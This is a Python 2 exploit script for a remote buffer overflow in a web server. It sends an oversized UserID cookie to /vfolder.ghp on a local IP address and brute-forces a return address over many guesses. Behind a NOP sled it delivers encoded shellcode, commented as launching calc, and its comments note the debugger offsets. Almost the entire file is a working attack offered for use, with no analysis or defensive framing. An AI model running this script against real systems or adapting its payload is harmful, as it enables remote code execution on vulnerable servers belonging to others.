#!/usr/bin/python

import struct,os,socket,sys

host = '192.168.1.29'
port = 80

# calc
shellcode = ("\xbb\xd9\xee\x7a\x92\xda\xdf\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x31\x31\x58\x13\x03\x58\x13\x83\xc0\xdd\x0c\x8f\x6e\x35\x52"
"\x70\x8f\xc5\x33\xf8\x6a\xf4\x73\x9e\xff\xa6\x43\xd4\x52\x4a"
"\x2f\xb8\x46\xd9\x5d\x15\x68\x6a\xeb\x43\x47\x6b\x40\xb7\xc6"
"\xef\x9b\xe4\x28\xce\x53\xf9\x29\x17\x89\xf0\x78\xc0\xc5\xa7"
"\x6c\x65\x93\x7b\x06\x35\x35\xfc\xfb\x8d\x34\x2d\xaa\x86\x6e"
"\xed\x4c\x4b\x1b\xa4\x56\x88\x26\x7e\xec\x7a\xdc\x81\x24\xb3"
"\x1d\x2d\x09\x7c\xec\x2f\x4d\xba\x0f\x5a\xa7\xb9\xb2\x5d\x7c"
"\xc0\x68\xeb\x67\x62\xfa\x4b\x4c\x93\x2f\x0d\x07\x9f\x84\x59"
"\x4f\x83\x1b\x8d\xfb\xbf\x90\x30\x2c\x36\xe2\x16\xe8\x13\xb0"
"\x37\xa9\xf9\x17\x47\xa9\xa2\xc8\xed\xa1\x4e\x1c\x9c\xeb\x04"
"\xe3\x12\x96\x6a\xe3\x2c\x99\xda\x8c\x1d\x12\xb5\xcb\xa1\xf1"
"\xf2\x24\xe8\x58\x52\xad\xb5\x08\xe7\xb0\x45\xe7\x2b\xcd\xc5"
"\x02\xd3\x2a\xd5\x66\xd6\x77\x51\x9a\xaa\xe8\x34\x9c\x19\x08"
"\x1d\xff\xfc\x9a\xfd\x2e\x9b\x1a\x67\x2f")

# 10016463    FFD7 CALL EDI
# EDX overwritten at 015198FC (offset 80 which is the address of EDI)
# 00468702                |. FF52 28                CALL DWORD PTR DS:[EDX+28]

for i in xrange(1,255):
	n = ""
	if i < 16:
		n = "0" + hex(i)[-1]
	else:
		n = hex(i)[2:]
	
	guess = "0x01" + n + "9898"
	print "trying", guess

	payload = 'A' * 20
	payload += struct.pack("<I",0x10016463)
	payload += 'A' * 56
	payload += struct.pack("<I",int(guess, 16))
	payload += '\x90' * 10
	payload += shellcode
	payload += '\x90' * (3000 - len(payload))

	#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

	request = (
	"GET /vfolder.ghp HTTP/1.1\r\n"
	"User-Agent: Mozilla/4.0\r\n"
	"Host: 192.168.1.29:80\r\n"
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	"Accept-Language: en-us\r\n"
	"Accept-Encoding: gzip, deflate\r\n"
	"Referer: http://192.168.1.29/\r\n"
	"Cookie: SESSION71; UserID=" + payload + "; PassWD=;\r\n"
	"Connection: Keep-Alive\r\n\r\n"
	)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	sock.send(request)
	sock.close()